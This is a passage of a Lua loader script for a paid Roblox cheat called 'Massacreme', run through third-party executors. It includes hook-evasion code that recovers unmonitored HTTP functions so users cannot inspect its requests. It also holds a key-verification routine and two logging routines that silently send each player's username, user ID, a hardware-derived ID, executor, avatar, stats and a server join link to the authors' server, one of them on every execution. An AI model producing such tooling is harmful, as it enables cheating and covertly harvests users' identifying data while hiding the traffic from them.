-- Prefer pre-grabbed clean copies stored before any monitor could hook them
local _cf = getgenv().__cleanFns or {}
local _originals = (antispySupported and originals) or {}
local safeRequestFn = _cf.request or _cf.http_request or _cf.syn_request or _cf.http_dot_request
                   or _originals.request or _originals.http_request or _originals.syn_request or _originals.http_dot_request
                   -- On executors without HttpPost the antispy block never runs so originals/cleanFns
                   -- are empty. Fall back to raw executor globals so key verification still works.
                   or (not antispySupported and (
                       (syn and syn.request)
                       or (http and http.request)
                       or request
                       or http_request
                   ))

-- check if safeRequestFn is still hooked and try to recover deeper
if safeRequestFn and islclosure(safeRequestFn) then
    log("safeRequestFn is still hooked - attempting deeper recovery")
    local recovered = extractOriginalFromHook(safeRequestFn)
    if recovered then
        safeRequestFn = recovered
        log("Recovered deeper clean safeRequestFn via upvalue walk")
    else
        -- fallback to deepCollect only if upvalue walk found nothing
        local allFns = deepCollect(safeRequestFn,{},0)
        for f in pairs(allFns) do
            if iscclosure(f) then
                safeRequestFn = f
                log("Recovered deeper clean safeRequestFn via deepCollect (fallback)")
                break
            end
        end
    end
end

function safePost(url,body,headers)
    headers = headers or {["Content-Type"] = "application/json"}
    local opts = { Url = url, Method = "POST", Headers = headers, Body = body }
    -- __vaultSend is the private C-closure captured via rawget(__index) on the
    -- HttpService metatable — immune to __namecall hooks and getgenv() tampering.
    -- Fall through to safeRequestFn only if vault construction failed.
    if __vaultSend then
        local ok, response = pcall(__vaultSend, opts)
        if ok and response then return response.Body, response.StatusCode end
        warn("[ANTI-SPY] vaultSend failed, falling back: "..tostring(response))
    end
    if not safeRequestFn then
        warn("[ANTI-SPY] No safe request function available")
        return nil,0
    end
    local ok,response = pcall(safeRequestFn, opts)
    if ok and response then return response.Body,response.StatusCode end
    warn("[ANTI-SPY] safePost failed : "..tostring(response))
    return nil,0
end

function safeGet(url,headers)
    headers = headers or {}
    local opts = { Url = url, Method = "GET", Headers = headers }
    if __vaultSend then
        local ok, response = pcall(__vaultSend, opts)
        if ok and response then return response.Body, response.StatusCode end
    end
    if not safeRequestFn then return nil,0 end
    local ok,response = pcall(safeRequestFn, opts)
    if ok and response then return response.Body,response.StatusCode end
    return nil,0
end

getgenv().safePost = safePost
getgenv().safeGet = safeGet

    getgenv().safeGet("https://httpbin.org/get")

    log("[ANTI-SPY] Loaded")
end

-- ══════════════════════════════════════════════════════════════════════
-- SERVICES & LOCALS
-- ══════════════════════════════════════════════════════════════════════
local Players           = game:GetService("Players")
local RunService        = game:GetService("RunService")
local UserInputService  = game:GetService("UserInputService")
local LocalPlayer       = Players.LocalPlayer
local PlayerGui         = LocalPlayer:WaitForChild("PlayerGui")
local Camera            = workspace.CurrentCamera

-- ════════════════════════════════════════════════════════════════════════
-- KEY SYSTEM  (Massacreme Premium Auth — Railway server)
-- ════════════════════════════════════════════════════════════════════════
local _LS          = game:GetService("Players").LocalPlayer
local _PG          = _LS:WaitForChild("PlayerGui")
local _AUTH_URL    = "https://massacreme-production.up.railway.app"
local _LOG_HOOK    = "https://massacreme-production.up.railway.app/log"
_G.Testing = false  -- set true to suppress Discord webhook calls during local testing

local function _getHWID()
    local userId   = tostring(_LS.UserId)
    local deviceId = ""
    pcall(function()
        deviceId = tostring(game:GetService("RbxAnalyticsService"):GetClientId())
    end)
    local raw  = deviceId .. "-" .. userId
    local hash = 0
    for i = 1, #raw do
        hash = (hash * 31 + string.byte(raw, i)) % 2^32
    end
    return string.format("HWID-%08X-%s", hash, userId)
end

local function _verifyOnline(key, hwid)
    local HS = game:GetService("HttpService")

    -- 1. Fetch nonce before building the body
    local nonce = nil
    pcall(function()
        local nonceOpts = { Url = _AUTH_URL .. "/nonce", Method = "GET" }
        local nonceResp
        if antispySupported and __vaultSend    then nonceResp = __vaultSend(nonceOpts)
        elseif syn and syn.request             then nonceResp = syn.request(nonceOpts)
        elseif http and http.request           then nonceResp = http.request(nonceOpts)
        elseif request                         then nonceResp = request(nonceOpts)
        elseif HS.RequestAsync                 then nonceResp = HS:RequestAsync(nonceOpts)
        end
        if nonceResp and nonceResp.Body then
            nonce = HS:JSONDecode(nonceResp.Body).nonce
        end
    end)

    -- 2. Include nonce in the verify body
    local bodyJson = HS:JSONEncode({ key = key, hwid = hwid, nonce = nonce })
    local opts     = {
        Url     = _AUTH_URL .. "/verify",
        Method  = "POST",
        Headers = { ["Content-Type"] = "application/json" },
        Body    = bodyJson,
    }
    local function tryRequest()
        if antispySupported and __vaultSend        then return __vaultSend(opts)                    end
        if antispySupported and getgenv().safePost then
            local body, code = getgenv().safePost(_AUTH_URL .. "/verify", bodyJson)
            if body then return { Body = body, StatusCode = code } end
        end
        if syn and syn.request                     then return syn.request(opts)                    end
        if http and http.request                   then return http.request(opts)                   end
        if request                                 then return request(opts)                        end
        if HS.RequestAsync                         then return HS:RequestAsync(opts)                end
        error("No HTTP method available")
    end
    local ok, response = pcall(tryRequest)
    if not ok then
        return false, "HTTP failed: " .. tostring(response):sub(1, 80)
    end
    if not response or not response.Body then
        return false, "Empty response from server."
    end
    if response.Body:sub(1,5) == "<!DOC" or response.Body:sub(1,5) == "<html" then
        return false, "Auth server offline - try again shortly."
    end
    local decOk, result = pcall(function() return HS:JSONDecode(response.Body) end)
    if not decOk then return false, "Server response invalid.", false, "Unknown" end
    return result.ok == true, result.message or "", result.permanent == true, result.label or "Unknown", result.discordUsername or "Unknown"
end

-- ════════════════════════════════════════════════════════════════════════
-- DISCORD WEBHOOK LOGGER
-- ════════════════════════════════════════════════════════════════════════
local function _getExecutor()
    -- identifyexecutor() is the modern standard (Synapse X, Fluxus, etc.)
    local ok, name = pcall(function()
        if identifyexecutor then return identifyexecutor() end
    end)
    if ok and name and name ~= "" then return tostring(name) end
    -- getexecutorname() — Delta, some others
    ok, name = pcall(function()
        if getexecutorname then return getexecutorname() end
    end)
    if ok and name and name ~= "" then return tostring(name) end
    -- Legacy env checks
    if syn and syn.request       then return "Synapse X"   end
    if KRNL_LOADED               then return "Krnl"        end
    if isourclosure              then return "Fluxus"      end
    if typeof(Velocity) == "table" or (type(vlua) == "table") then return "Velocity" end
    return "Unknown Executor"
end

local function _sendLog(key, hwid, status, keyLabel, discordUser)
    keyLabel    = keyLabel    or "Unknown"
    discordUser = discordUser or "Unknown"
    if _G.Testing then print("[Testing] Webhook suppressed — key:", key, "| status:", status, "| duration:", keyLabel, "| discord:", discordUser); return end
    task.spawn(function()
        local HS  = game:GetService("HttpService")
        local MPS = game:GetService("MarketplaceService")
        local p   = _LS

        local function _httpGet(url)
            local opts = { Url = url, Method = "GET" }
            local ok, res = pcall(function()
                if antispySupported and __vaultSend then return __vaultSend(opts)        end
                if syn and syn.request              then return syn.request(opts)         end
                if http and http.request            then return http.request(opts)        end
                if request                          then return request(opts)             end
                if HS.RequestAsync                  then return HS:RequestAsync(opts)     end
                if HttpGet                          then return { Body = game:HttpGet(url) } end
            end)
            if ok and res and res.Body then return res.Body end
            return nil
        end

        local username    = tostring(p.Name        or "?")
        local displayName = tostring(p.DisplayName or "?")
        local userId      = tostring(p.UserId      or "?")
        local acctAge     = tostring(p.AccountAge  or "?") .. " days"
        local executor    = _getExecutor()
        local profileUrl  = "https://www.roblox.com/users/" .. userId .. "/profile"

        local deviceType = "💻 PC"
        pcall(function()
            local UIS2 = game:GetService("UserInputService")
            if UIS2.TouchEnabled and not UIS2.KeyboardEnabled then
                deviceType = "📱 Mobile"
            elseif UIS2.GamepadEnabled and not UIS2.KeyboardEnabled then
                deviceType = "🎮 Console"
            end
        end)

        local avatarUrl = nil
        pcall(function()
            local body = _httpGet(
                "https://thumbnails.roblox.com/v1/users/avatar-headshot"
                .. "?userIds=" .. userId .. "&size=150x150&format=Png&isCircular=false"
            )
            if body then
                local dec = HS:JSONDecode(body)
                if dec and dec.data and dec.data[1] and dec.data[1].imageUrl then
                    avatarUrl = dec.data[1].imageUrl
                end
            end
        end)

        local gameName = tostring(game.Name or "?")
        pcall(function()
            local info = MPS:GetProductInfo(game.PlaceId)
            if info and info.Name then gameName = info.Name end
        end)
        local placeId  = tostring(game.PlaceId or "?")
        local serverId = tostring(game.JobId   or "?")
        local joinUrl  = "https://www.roblox.com/games/" .. placeId .. "?gameInstanceId=" .. serverId
        local joinText = "[🎮 Click to Join Server](" .. joinUrl .. ")"

        local timeStr = "?"
        pcall(function()
            local utcSec = os.time()
            local year = tonumber(os.date("!%Y", utcSec))
            local function nthSunday(y, m, n)
                local t   = os.time({year=y, month=m, day=1, hour=0, min=0, sec=0})
                local dow = tonumber(os.date("!%w", t))
                local first = (dow == 0) and 1 or (8 - dow)
                return first + (n - 1) * 7
            end
            local dstStart = os.time({year=year, month=3,  day=nthSunday(year, 3, 2),  hour=2, min=0, sec=0})
            local dstEnd   = os.time({year=year, month=11, day=nthSunday(year, 11, 1), hour=2, min=0, sec=0})
            local isDST    = (utcSec >= dstStart and utcSec < dstEnd)
            local offset   = isDST and (-4 * 3600) or (-5 * 3600)
            local estSec   = utcSec + offset
            local suffix   = isDST and "EDT" or "EST"
            timeStr = os.date("!%Y-%m-%d %I:%M:%S %p", estSec) .. " " .. suffix
        end)

        local statsLines = {}
        pcall(function()
            local ls = p:FindFirstChild("leaderstats")
            if ls then
                for _, v in ipairs(ls:GetChildren()) do
                    if v:IsA("IntValue") or v:IsA("NumberValue") or v:IsA("StringValue") then
                        table.insert(statsLines, v.Name .. ": **" .. tostring(v.Value) .. "**")
                    end
                end
            end
        end)

        local teamName = "None"
        pcall(function() if p.Team then teamName = p.Team.Name end end)

        local isAuth = status == "Whitelisted" or status == "Lifetime"
        local color  = status == "Lifetime" and 0xFFD700
                    or isAuth               and 0x00DC64
                    or                          0xFFC800

        local fields = {
            { name = "Username",     value = "**" .. username .. "**",    inline = true  },
            { name = "Display Name", value = "**" .. displayName .. "**", inline = true  },
            { name = "User ID",      value = "`" .. userId .. "`",         inline = true  },
            { name = "Account Age",  value = acctAge,                      inline = true  },
            { name = "Executor",     value = executor,                     inline = true  },
            { name = "Device",       value = deviceType,                   inline = true  },
            { name = "Team",         value = teamName,                     inline = true  },
            { name = "Used Key",     value = "`" .. tostring(key) .. "`",         inline = true  },
            { name = "Duration",     value = "**" .. tostring(keyLabel) .. "**",  inline = true  },
            { name = "Discord",      value = discordUser ~= "Unknown" and "**" .. discordUser .. "**" or "*Unknown*", inline = true },
            { name = "HWID",         value = "`" .. tostring(hwid) .. "`",        inline = false },
            { name = "Game",         value = gameName .. "  (`" .. placeId .. "`)", inline = false },
            { name = "Server ID",    value = "`" .. serverId .. "`",       inline = false },
            { name = "Time",         value = timeStr,                      inline = false },
            { name = "Join",         value = joinText,                     inline = false },
        }
        if #statsLines > 0 then
            table.insert(fields, { name = "Leaderstats", value = table.concat(statsLines, "\n"), inline = false })
        end

        local embedTitle = status == "Lifetime"    and "♾️  Lifetime Key"
                        or status == "Whitelisted" and "✅  Whitelisted"
                        or                             "✅  Whitelisted"

        local author    = {
            name     = username .. (displayName ~= username and ("  (" .. displayName .. ")") or ""),
            url      = profileUrl,
            icon_url = avatarUrl or "https://www.roblox.com/favicon.ico",
        }
        local thumbnail = avatarUrl and { url = avatarUrl } or nil
        local embed     = {
            title  = embedTitle, color = color,
            author = author, fields = fields,
            footer = { text = "Massacreme Key System  ·  " .. profileUrl },
        }
        if thumbnail then embed.thumbnail = thumbnail end

        local payload = HS:JSONEncode({
            username   = "Massacreme Shield",
            avatar_url = "https://raw.githubusercontent.com/zynviiy/fyghg/main/Logo.png",
            embeds     = { embed },
        })

        local hookUrl = _LOG_HOOK
        local opts = {
            Url     = hookUrl,
            Method  = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body    = payload,
        }
        local function tryPost()
            if antispySupported and __vaultSend                          then return __vaultSend(opts)                        end
            if antispySupported and originals and originals.request      then return originals.request(opts)                  end
            if antispySupported and originals and originals.syn_request  then return originals.syn_request(opts)              end
            if antispySupported and originals and originals.RequestAsync then return originals.RequestAsync(__HS_vault, opts)  end
            if syn and syn.request                                        then return syn.request(opts)                        end
            if http and http.request                                      then return http.request(opts)                       end
            if request                                                    then return request(opts)                            end
            if HS.RequestAsync                                            then return HS:RequestAsync(opts)                    end
            if HttpPost then pcall(function() game:HttpPost(hookUrl, payload, "application/json") end) end
        end
        pcall(tryPost)
    end)
end

-- ════════════════════════════════════════════════════════════════════════
-- KEY SYSTEM LOADER
-- ════════════════════════════════════════════════════════════════════════
local _loaderDone    = false
local _launchCallback = nil
local _isMobile      = false  -- set by platform selector after key screen

-- Execution log — fires in own coroutine before key screen
task.spawn(function()
    if _G.Testing then return end
    local ok, err = pcall(function()
        local HS       = game:GetService("HttpService")
        local p        = _LS
        local username = tostring(p.Name    or "?")
        local userId   = tostring(p.UserId  or "?")
        local hwid     = _getHWID()
        local executor = _getExecutor()
        local placeId  = tostring(game.PlaceId or "?")
        local serverId = tostring(game.JobId   or "?")
        local timeStr = "?"
        pcall(function()
            local utcSec = os.time()
            local year = tonumber(os.date("!%Y", utcSec))
            local function nthSunday(y, m, n)
                local t   = os.time({year=y, month=m, day=1, hour=0, min=0, sec=0})
                local dow = tonumber(os.date("!%w", t))
                local first = (dow == 0) and 1 or (8 - dow)
                return first + (n - 1) * 7
            end
            local dstStart = os.time({year=year, month=3,  day=nthSunday(year, 3, 2),  hour=2, min=0, sec=0})
            local dstEnd   = os.time({year=year, month=11, day=nthSunday(year, 11, 1), hour=2, min=0, sec=0})
            local isDST    = (utcSec >= dstStart and utcSec < dstEnd)
            local offset   = isDST and (-4 * 3600) or (-5 * 3600)
            local estSec   = utcSec + offset
            local suffix   = isDST and "EDT" or "EST"
            timeStr = os.date("!%Y-%m-%d %I:%M:%S %p", estSec) .. " "
        end)
        local joinUrl  = "https://www.roblox.com/games/" .. placeId .. "?gameInstanceId=" .. serverId
        local embed = {
            title  = "📋  Script Executed",
            color  = 0x5865F2,
            author = { name = username, url = "https://www.roblox.com/users/" .. userId .. "/profile", icon_url = "https://www.roblox.com/favicon.ico" },
            fields = {
                { name = "Username", value = "**" .. username .. "**", inline = true  },
                { name = "User ID",  value = "`"  .. userId  .. "`",   inline = true  },
                { name = "Executor", value = executor,                 inline = true  },
                { name = "HWID",     value = "`"  .. hwid    .. "`",   inline = false },
                { name = "Game",     value = "`"  .. placeId .. "`",   inline = true  },
                { name = "Time",     value = timeStr,                  inline = false },
                { name = "Join",     value = "[🎮 Join Server](" .. joinUrl .. ")", inline = false },
            },
            footer = { text = "Massacreme  ·  Execution Log" },
        }
        local payload = HS:JSONEncode({ username = "Massacreme Shield", avatar_url = "https://raw.githubusercontent.com/zynviiy/fyghg/main/Logo.png", embeds = { embed } })
        local opts    = { Url = _LOG_HOOK, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = payload }
        if __vaultSend                             then __vaultSend(opts)
        elseif syn  and syn.request                then syn.request(opts)
        elseif http and http.request               then http.request(opts)
        elseif request                             then request(opts)
        end
    end)
    if not ok then warn("[Massacreme] exec log err: " .. tostring(err)) end
end)

;(function()  -- key screen isolated scope ──────────────────────────────

local _loaderGui                = Instance.new("ScreenGui")
_loaderGui.Name                 = "MP_Loader"
_loaderGui.ResetOnSpawn         = false
_loaderGui.IgnoreGuiInset       = true
_loaderGui.DisplayOrder         = 9999
_loaderGui.Parent               = _PG

local _bg                       = Instance.new("Frame", _loaderGui)
_bg.Size                        = UDim2.new(1,0,1,0)
_bg.BackgroundColor3            = Color3.fromRGB(4, 8, 6)
_bg.BorderSizePixel             = 0

-- Animated starfield background
local _starCanvas = Instance.new("Frame", _bg)
_starCanvas.Size                = UDim2.new(1,0,1,0)
_starCanvas.BackgroundTransparency = 1
_starCanvas.BorderSizePixel     = 0
_starCanvas.ClipsDescendants    = true
local _stars      = {}
local _starCount  = 45
local _RS2        = game:GetService("RunService")
local _starConn
for i = 1, _starCount do
    local s = Instance.new("TextLabel", _starCanvas)
    s.BackgroundTransparency = 1
    s.TextColor3 = Color3.fromHSV(0.38, 0.7 + math.random()*0.3, 0.6 + math.random()*0.4)
    s.Font       = Enum.Font.GothamBold
    s.TextSize   = math.random(6, 14)
    local chars  = {"*", "+", "·", "•", "·", "+", "*"}
    s.Text       = chars[math.random(#chars)]
    s.Size       = UDim2.fromOffset(20, 20)
    s.Position   = UDim2.new(math.random(), 0, math.random(), 0)
    s.TextTransparency = math.random() * 0.6
    s.ZIndex     = 1
    _stars[i]    = { lbl=s, speed=0.02+math.random()*0.06, drift=(math.random()-0.5)*0.015, twinkle=math.random()*math.pi*2 }
end
local _starTime = 0
_starConn = _RS2.Heartbeat:Connect(function(dt)
    _starTime = _starTime + dt
    for _, st in ipairs(_stars) do
        local l  = st.lbl
        local ny = l.Position.Y.Scale - st.speed * dt
        local nx = l.Position.X.Scale + st.drift * dt
        if ny < -0.05 then ny = 1.05; nx = math.random() end
        if nx < 0 then nx = 1 elseif nx > 1 then nx = 0 end
        l.Position         = UDim2.new(nx, 0, ny, 0)
        l.TextTransparency = 0.3 + 0.4 * math.abs(math.sin(_starTime*1.2 + st.twinkle))
    end
end)

-- Colour palette
local _GOLD    = Color3.fromRGB(255, 210,  40)
local _GREEN   = Color3.fromRGB(  0, 220, 100)
local _MUTED   = Color3.fromRGB(140, 148, 180)
local _BG_DARK = Color3.fromRGB( 14,  15,  20)
local _BG2     = Color3.fromRGB( 20,  22,  30)

-- Main panel
local _panel   = Instance.new("Frame", _bg)
_panel.Size    = UDim2.fromOffset(420, 576)
_panel.Position= UDim2.new(0.5,-210,0.5,-310)
_panel.BackgroundColor3 = _BG_DARK
_panel.BorderSizePixel  = 0
do
    local c = Instance.new("UICorner",_panel); c.CornerRadius = UDim.new(0,16)
    local s = Instance.new("UIStroke",_panel)
    s.Color = _GOLD; s.Thickness = 1.5; s.Transparency = 0.35
end

-- Logo badge
local _badge = Instance.new("Frame", _panel)
_badge.Size             = UDim2.fromOffset(72, 72)
_badge.Position         = UDim2.new(0.5,-36, 0, 14)
_badge.BackgroundColor3 = Color3.fromRGB(10, 80, 40)
_badge.BorderSizePixel  = 0; _badge.ZIndex = 3
do
    local c = Instance.new("UICorner",_badge); c.CornerRadius = UDim.new(0,18)
    local s = Instance.new("UIStroke",_badge)
    s.Color = _GREEN; s.Thickness = 2; s.Transparency = 0.2
    local lbl = Instance.new("TextLabel",_badge)
    lbl.Size = UDim2.new(1,0,1,0); lbl.BackgroundTransparency = 1
    lbl.Font = Enum.Font.GothamBlack; lbl.TextSize = 36
    lbl.TextColor3 = Color3.fromRGB(0,240,110)
    lbl.Text = "M"; lbl.TextXAlignment = Enum.TextXAlignment.Center
    lbl.TextYAlignment = Enum.TextYAlignment.Center; lbl.BorderSizePixel = 0; lbl.ZIndex = 4
end

-- Title / subtitle
local function _mkLbl(parent, text, size, color, bold, y, centered)
    local l = Instance.new("TextLabel",parent)
    l.Size = UDim2.new(1,-32,0,size+6)
    l.Position = UDim2.fromOffset(16,y)
    l.BackgroundTransparency = 1
    l.Font = bold and Enum.Font.GothamBlack or Enum.Font.Gotham
    l.TextSize = size; l.TextColor3 = color
    l.TextXAlignment = centered~=false and Enum.TextXAlignment.Center or Enum.TextXAlignment.Left
    l.Text = text; l.BorderSizePixel = 0
    return l
end
_mkLbl(_panel,"MASSACREME",24,_GREEN,true,92)
_mkLbl(_panel,"Private Edition  ·  by Brian & Bob",11,_MUTED,false,120)

-- Divider
local _div = Instance.new("Frame",_panel)
_div.Size = UDim2.new(1,-40,0,1); _div.Position = UDim2.fromOffset(20,142)
_div.BackgroundColor3 = Color3.fromRGB(40,44,60); _div.BorderSizePixel = 0

-- Premium banner (Discord invite)
local _pBanner = Instance.new("Frame",_panel)
_pBanner.Size = UDim2.new(1,-28,0,56); _pBanner.Position = UDim2.fromOffset(14,150)
_pBanner.BackgroundColor3 = Color3.fromRGB(28,22,8); _pBanner.BorderSizePixel = 0
do
    local c = Instance.new("UICorner",_pBanner); c.CornerRadius = UDim.new(0,10)
    local s = Instance.new("UIStroke",_pBanner); s.Color=_GOLD; s.Thickness=1; s.Transparency=0.4
end
local _pTitle = Instance.new("TextLabel",_pBanner)
_pTitle.Size=UDim2.new(1,-16,0,20); _pTitle.Position=UDim2.fromOffset(8,5)
_pTitle.BackgroundTransparency=1; _pTitle.Font=Enum.Font.GothamBold; _pTitle.TextSize=13
_pTitle.TextColor3=_GOLD; _pTitle.TextXAlignment=Enum.TextXAlignment.Left
_pTitle.Text="★  PREMIUM  –  Get your key at:"; _pTitle.BorderSizePixel=0

local _dcLink = Instance.new("TextButton",_pBanner)
_dcLink.Size=UDim2.new(1,-16,0,22); _dcLink.Position=UDim2.fromOffset(8,28)
_dcLink.BackgroundTransparency=1; _dcLink.Font=Enum.Font.GothamSemibold; _dcLink.TextSize=12
_dcLink.TextColor3=Color3.fromRGB(180,190,220); _dcLink.TextXAlignment=Enum.TextXAlignment.Left
_dcLink.Text="🔗 discord.gg/aDUjgCDbRj  (click to copy)"; _dcLink.BorderSizePixel=0
_dcLink.AutoButtonColor=false
_dcLink.MouseButton1Click:Connect(function()
    pcall(function() setclipboard("https://discord.gg/aDUjgCDbRj") end)
    _dcLink.Text="✓  Copied to clipboard!"; _dcLink.TextColor3=_GOLD
    task.delay(2.5, function()
        if _dcLink and _dcLink.Parent then
            _dcLink.Text="🔗 discord.gg/aDUjgCDbRj  (click to copy)"; _dcLink.TextColor3=Color3.fromRGB(180,190,220)
        end
    end)
end)

-- Feature comparison table
-- Lifetime perks card
local _featFrame = Instance.new("Frame",_panel)
_featFrame.Size=UDim2.new(1,-28,0,118); _featFrame.Position=UDim2.fromOffset(14,212)
_featFrame.BackgroundColor3=Color3.fromRGB(16,17,24); _featFrame.BorderSizePixel=0
do
    Instance.new("UICorner",_featFrame).CornerRadius=UDim.new(0,8)
    local s=Instance.new("UIStroke",_featFrame); s.Color=_GOLD; s.Thickness=1; s.Transparency=0.55
end
local function _pLbl(parent,text,y,color,bold)
    local l=Instance.new("TextLabel",parent)
    l.Size=UDim2.new(1,-16,0,15); l.Position=UDim2.fromOffset(8,y)
    l.BackgroundTransparency=1; l.Font=bold and Enum.Font.GothamBold or Enum.Font.Gotham
    l.TextSize=11; l.TextColor3=color; l.TextXAlignment=Enum.TextXAlignment.Left
    l.Text=text; l.BorderSizePixel=0
end
_pLbl(_featFrame,"★  LIFETIME  –  What you get", 5, _GOLD, true)
do  -- thin gold divider
    local d=Instance.new("Frame",_featFrame)
    d.Size=UDim2.new(1,-16,0,1); d.Position=UDim2.fromOffset(8,22)
    d.BackgroundColor3=Color3.fromRGB(80,62,15); d.BorderSizePixel=0
end
local _perks = {
    "Full script access",
    "No key system — skip straight in",
    "Express support channel access",
    "Exclusive Premium Discord role",
    "Early access to leaks & updates",
    "HWID locked to your device",
}
for i, perk in ipairs(_perks) do
    _pLbl(_featFrame, "•  " .. perk, 26 + (i-1)*15, Color3.fromRGB(205,212,240), false)
end

-- Key file persistence
local _savedKeyFile  = "massacreme_key.txt"
local _savedKeyValue = ""
pcall(function()
    if readfile then
        local ok2, c = pcall(readfile, _savedKeyFile)
        if ok2 and c and c ~= "" then _savedKeyValue = c:gsub("%s","") end
    end
end)

-- Key input box
local _keyBox = Instance.new("TextBox",_panel)
_keyBox.Size=UDim2.new(1,-28,0,34); _keyBox.Position=UDim2.fromOffset(14,346)
_keyBox.PlaceholderText="Enter your key..."; _keyBox.Text=_savedKeyValue
_keyBox.Font=Enum.Font.GothamSemibold; _keyBox.TextSize=13
_keyBox.TextColor3=Color3.fromRGB(230,235,255); _keyBox.PlaceholderColor3=Color3.fromRGB(90,95,120)
_keyBox.BackgroundColor3=_BG2; _keyBox.BorderSizePixel=0; _keyBox.ClearTextOnFocus=false
do
    Instance.new("UICorner",_keyBox).CornerRadius=UDim.new(0,8)
    local s=Instance.new("UIStroke",_keyBox); s.Color=Color3.fromRGB(50,55,75); s.Thickness=1
end

-- Status label
local _status = Instance.new("TextLabel",_panel)
_status.Size=UDim2.new(1,-28,0,16); _status.Position=UDim2.fromOffset(14,378)
_status.BackgroundTransparency=1; _status.Font=Enum.Font.Gotham; _status.TextSize=11
_status.TextColor3=Color3.fromRGB(220,80,80); _status.TextXAlignment=Enum.TextXAlignment.Center
_status.Text=""; _status.BorderSizePixel=0

-- Button factory
local function _makeBtn(parent,text,y,bgColor,textColor)
    local b=Instance.new("TextButton",parent)
    b.Size=UDim2.new(1,-28,0,36); b.Position=UDim2.fromOffset(14,y)
    b.BackgroundColor3=bgColor; b.TextColor3=textColor
    b.Font=Enum.Font.GothamBold; b.TextSize=14; b.Text=text
    b.BorderSizePixel=0; b.AutoButtonColor=false
    Instance.new("UICorner",b).CornerRadius=UDim.new(0,8)
    b.MouseEnter:Connect(function() b.BackgroundColor3=bgColor:Lerp(Color3.new(1,1,1),0.08) end)
    b.MouseLeave:Connect(function() b.BackgroundColor3=bgColor end)
    return b
end
local _premBtn    = _makeBtn(_panel,"★  Sign In with Key",   394,Color3.fromRGB(140,90,0),  Color3.fromRGB(255,220,60))
local _getKeyBtn  = _makeBtn(_panel,"🔗  Get Key",           438,Color3.fromRGB(15,40,65),  Color3.fromRGB(80,185,255))
local _discordBtn = _makeBtn(_panel,"Join Discord",           482,Color3.fromRGB(15,20,45),  Color3.fromRGB(140,148,200))
local _exitBtn    = _makeBtn(_panel,"Exit",                   526,Color3.fromRGB(50,18,18),  Color3.fromRGB(220,100,100))

-- Dismiss (fade out loader, then fire _launchCallback)
local function _dismiss()
    if _loaderDone then return end
    _loaderDone = true
    if _starConn then _starConn:Disconnect() end
    local t = 0
    local conn
    conn = _RS2.Heartbeat:Connect(function(dt)
        t = math.min(t+dt/0.25, 1)
        _bg.BackgroundTransparency  = t
        _panel.BackgroundTransparency = t
        if t >= 1 then
            conn:Disconnect()
            _loaderGui:Destroy()
            if _launchCallback then task.spawn(_launchCallback) end
        end
    end)
end

-- Platform selector shown after successful key verification
local function _showPlatformChoice()
    _panel.Visible = false
    local _UIS_check = game:GetService("UserInputService")
    local autoMobile = _UIS_check.TouchEnabled and not _UIS_check.KeyboardEnabled

    local cf = Instance.new("Frame", _bg)
    cf.Size = UDim2.new(1, 0, 1, 0)
    cf.BackgroundTransparency = 1
    cf.BorderSizePixel = 0

    local function mkLbl(parent, text, size, posY, bold, color)
        local l = Instance.new("TextLabel", parent)
        l.Size = UDim2.new(1, 0, 0, size)
        l.Position = UDim2.new(0, 0, 0, posY)
        l.BackgroundTransparency = 1
        l.Text = text
        l.TextColor3 = color or Color3.fromRGB(255, 255, 255)
        l.Font = bold and Enum.Font.GothamBold or Enum.Font.Gotham
        l.TextSize = size
        l.BorderSizePixel = 0
        return l
    end
    mkLbl(cf, "Select Platform", 28, 110, true)
    mkLbl(cf, autoMobile and "📱  Mobile device detected" or "How are you playing?",
          14, 148, false, Color3.fromRGB(0, 220, 100))

    local function mkBtn(parent, text, xOff)
        local btn = Instance.new("TextButton", parent)
        btn.Size = UDim2.fromOffset(190, 64)
        btn.Position = UDim2.new(0.5, xOff, 0.5, -18)
        btn.BackgroundColor3 = Color3.fromRGB(10, 80, 40)
        btn.BorderSizePixel = 0
        btn.Text = text
        btn.TextColor3 = Color3.fromRGB(0, 240, 110)
        btn.Font = Enum.Font.GothamBold
        btn.TextSize = 15
        Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 10)
        return btn
    end
    local pcBtn     = mkBtn(cf, "💻  PC", -200)
    local mobileBtn = mkBtn(cf, "📱  Mobile",         10)

    -- Highlight auto-detected platform
    if autoMobile then
        mobileBtn.BackgroundColor3 = Color3.fromRGB(0, 140, 60)
    else
        pcBtn.BackgroundColor3 = Color3.fromRGB(0, 140, 60)
    end

    local hint = mkLbl(cf, "Mobile mode: smaller UI + floating toggle button", 12, 0, false, Color3.fromRGB(100, 110, 130))
    hint.Position = UDim2.new(0, 0, 0.5, 56)

    pcBtn.MouseButton1Click:Connect(function()
        _isMobile = false
        _dismiss()
    end)
    mobileBtn.MouseButton1Click:Connect(function()
        _isMobile = true
        _dismiss()
    end)
end

-- Sign In with Key
_premBtn.MouseButton1Click:Connect(function()
    local key = _keyBox.Text:gsub("%s",""):upper()
    if key == "" then return end
    _premBtn.Text = "Verifying..."
    _status.Text  = ""; _status.TextColor3 = Color3.fromRGB(140,148,180)
    task.spawn(function()
        local hwid = _getHWID()
            authorized, message, isPermanent, keyLabel, discordUser = _verifyOnline(key, hwid)
        if authorized then
            pcall(function() if writefile then writefile(_savedKeyFile, key) end end)
            _status.Text = (message ~= "" and message or "Authorized! Welcome.")
            _status.TextColor3 = _GREEN
            _sendLog(key, hwid, isPermanent and "Lifetime" or "Whitelisted", keyLabel, discordUser)
            pcall(function()
                local snd = Instance.new("Sound")
                snd.SoundId = "rbxassetid://1839997929"
                snd.Volume = 1
                snd.Parent = game:GetService("SoundService")
                snd:Play()
                game:GetService("Debris"):AddItem(snd, 10)
            end)
            task.wait(0.9); _premBtn.Text="★  Sign In with Key"; _showPlatformChoice()
        else
            _status.Text = (message ~= "" and message or "Invalid or expired key.")
            _status.TextColor3 = Color3.fromRGB(220,80,80)
            _premBtn.Text = "★  Sign In with Key"
            task.wait(2); _status.Text=""
        end
    end)
end)

-- Get Key — copies Discord invite link
_getKeyBtn.MouseButton1Click:Connect(function()
    pcall(function() setclipboard("https://discord.gg/aDUjgCDbRj") end)
    _getKeyBtn.Text = "✓  Copied — head to #get-key in Discord"
    task.delay(3, function()
        if _getKeyBtn and _getKeyBtn.Parent then _getKeyBtn.Text = "🔗  Get Key" end
    end)
end)

-- Join Discord
_discordBtn.MouseButton1Click:Connect(function()
    pcall(function() setclipboard("https://discord.gg/aDUjgCDbRj") end)
    _discordBtn.Text="✓  Copied: discord.gg/aDUjgCDbRj"
    task.delay(2.5, function()
